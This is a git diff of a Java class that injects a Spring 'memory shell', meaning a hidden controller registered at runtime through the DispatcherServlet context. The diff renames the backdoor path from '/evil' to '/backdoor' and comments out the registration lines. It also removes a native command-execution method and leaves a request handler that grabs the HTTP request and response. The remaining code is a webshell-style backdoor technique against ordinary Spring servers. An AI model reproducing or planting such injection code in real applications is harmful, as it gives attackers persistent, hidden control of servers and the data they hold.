@@ -20,7 +20,7 @@ import java.util.Scanner;
 public class MSpringController {
     static {
         try {
-            String inject_uri = "/evil";
+            String inject_uri = "/backdoor";
             System.out.println("Controller Injecting");
             WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
                     currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
@@ -60,23 +60,22 @@ public class MSpringController {
             // 构造注册信息
             //RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
 
-            RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
-            option.setPatternParser(new PathPatternParser());
-
-            RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build();
-
-            // 将该controller注册到Spring容器
-            mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2);
+//            RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
+//            option.setPatternParser(new PathPatternParser());
+//
+//            RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build();
+//
+//            // 将该controller注册到Spring容器
+//            mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2);
             System.out.println("Controller Injected");
         }catch (Exception e){
             e.printStackTrace();
         }
     }
 
-    public native String doExec(String cmd);
-
     @ResponseBody
     public void index() throws IOException {
+        System.out.println("working");
         // 获取请求
         HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
         HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
